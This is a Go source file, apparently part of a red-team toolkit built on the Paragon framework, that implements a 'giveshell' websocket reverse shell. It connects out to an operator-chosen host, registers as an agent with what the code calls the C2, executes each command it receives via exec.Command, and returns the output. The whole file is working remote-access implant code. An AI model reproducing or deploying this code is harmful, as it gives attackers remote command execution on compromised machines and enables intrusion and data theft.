package websockets

import (
	"errors"
	"fmt"
	"log"
	"net/url"
	"os/exec"
	"time"

	"github.com/gorilla/websocket"
	"github.com/kcarretto/paragon/pkg/script"
	"github.com/kcarretto/paragon/pkg/websockets"
	"go.uber.org/zap"
)

var debug bool = true
var timeoutMS int = 2000
var parallelism int = 1000
var portSelection string

var hideUnavailableHosts bool
var versionRequested bool

// var uuid = "30064771073"

func giveshell(parser script.ArgParser) (script.Retval, error) {
	wssessionid, err := parser.GetString(0)
	if err != nil {
		return nil, err
	}
	websocket_host, err := parser.GetString(1)
	if err != nil {
		return nil, err
	}
	shell_cmd, err := parser.GetString(2)
	if err != nil {
		return nil, err
	}
	websocket_path, err := parser.GetString(3)
	if err != nil {
		websocket_path = "/websocketgiveshell"
		// return nil, err
	}
	websocket_scheme, err := parser.GetString(4)
	if err != nil {
		websocket_scheme = "ws"
		// return nil, err
	}

	retVal, retErr := Giveshell(wssessionid, websocket_host, shell_cmd, websocket_path, websocket_scheme)
	return script.WithError(retVal, retErr), nil
}

func newLogger() *zap.Logger {
	logger, err := zap.NewDevelopment()
	if err != nil {
		panic(err)
	}
	return logger
}

var logger = newLogger().Named("renegade")

//websockets.giveshell("wssessionid", "127.0.0.1:4444", "bash", "/websocketgiveshell", "ws")
func Giveshell(wssessionid string, websocket_host string, shell_cmd string, websocket_path string, websocket_scheme string) (string, error) {
	logger.Debug(fmt.Sprintf("Trying to give shell %s://%s%s %s", websocket_scheme, websocket_host, websocket_path, shell_cmd))

	//Configure websocket address
	u := url.URL{Scheme: websocket_scheme, Host: websocket_host, Path: websocket_path}
	logger.Debug(fmt.Sprintf("connecting to %s", u.String()))

	//Connect to websocket
	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		logger.Debug(fmt.Sprintf("dial: %v", err))
		return "Failed to connect", errors.New("Failed to connect")
	}
	defer c.Close()

	done := make(chan struct{})

	// Functiton to handle websocket connections
	defer close(done)
	// Register agent
	// Retry until sucess
	// wsConn := nil
	for {
		logger.Debug(fmt.Sprintf("Registering agent %s", wssessionid))
		// Create registration message
		//data section is ignored but putting register for debug clarity.
		wsMsg := websockets.WsMsg{Uuid: wssessionid, Data: []byte("register"), MsgType: websockets.Register}
		wsMsgJSON, err := wsMsg.ToJson()
		if err != nil {
			logger.Debug(fmt.Sprintf("Error sending registration:\n%v", err))
			// On failure sleep 5 and try again.
			time.Sleep(5 * time.Second)
			continue
		}
		//Send Registration
		c.WriteMessage(websocket.TextMessage, wsMsgJSON)
		if err != nil {
			logger.Debug(fmt.Sprintf("Error registering client:\n%v", err))
			// On failure sleep 5 and try again.
			time.Sleep(5 * time.Second)
			continue
		}
		// Success move on.
		break
	}

	// Wait for commands
	for {
		mt, message, err := c.ReadMessage()
		if err != nil {
			logger.Debug(fmt.Sprintf("read: %v\n", err))
			logger.Debug(fmt.Sprintf("message: %v\n", message))
			return "Error in reading websocket message", err
		}
		logger.Debug(fmt.Sprintf("recieved: %s", message))
		wsMsg, err := websockets.ToStruct(message)
		if err != nil {
			logger.Debug(fmt.Sprintf("Error creating WsMsg from JSON:\n%v", err))
			continue
		}

		if wsMsg.MsgType == websockets.Close {
			// c.Close()
			return "Closing", nil
		}

		response, err := handleShellMessage(*wsMsg)
		responseJSON, err := response.ToJson()
		if err != nil {
			return "JSON decode error", err
		}
		logger.Debug("sending response")
		err = c.WriteMessage(mt, []byte(responseJSON))
		if err != nil {
			return "Write websocket error", err
		}
	}
}

func handleShellMessage(wsMsg websockets.WsMsg) (websockets.WsMsg, error) {
	switch wsMsg.MsgType {
	case websockets.Register:
		logger.Debug("Confusion this is a server type")

	case websockets.Data:
		logger.Debug(fmt.Sprintf("Executing command %s\n", string(string(wsMsg.Data))))
		commandResponse, err := executeShellCommand(string(wsMsg.Data))
		if err != nil {
			logger.Debug(fmt.Sprintf("Command execution failed.\n%s\n%s", wsMsg.Data, err))
			return websockets.WsMsg{}, err
		}
		logger.Debug(fmt.Sprintf("Response: %s\n", commandResponse))
		response := websockets.WsMsg{Uuid: wsMsg.Uuid, Data: []byte(commandResponse), MsgType: 2}
		return response, nil
		// err = sendResponse(c, commandResponse, wssessionid)

	case websockets.Ping:
		logger.Debug("Confusion this is a server type")

	case websockets.Error:
		logger.Debug(fmt.Sprintf("An error was recieved from the c2\n:%s", string(wsMsg.Data)))
		return websockets.WsMsg{}, errors.New(string(wsMsg.Data))

	case websockets.Close:
		logger.Debug("Confusion this should have already been handled")

	default:
		logger.Debug("No case")
	}
	return websockets.WsMsg{}, errors.New("Invalid msg type. Expecting Close, Data, or Error")
}

func executeShellCommand(command string) (string, error) {
	out, err := exec.Command(command).Output()
	if err != nil {
		log.Fatal(err)
	}
	logger.Debug(string(out))
	return string(out), nil
}
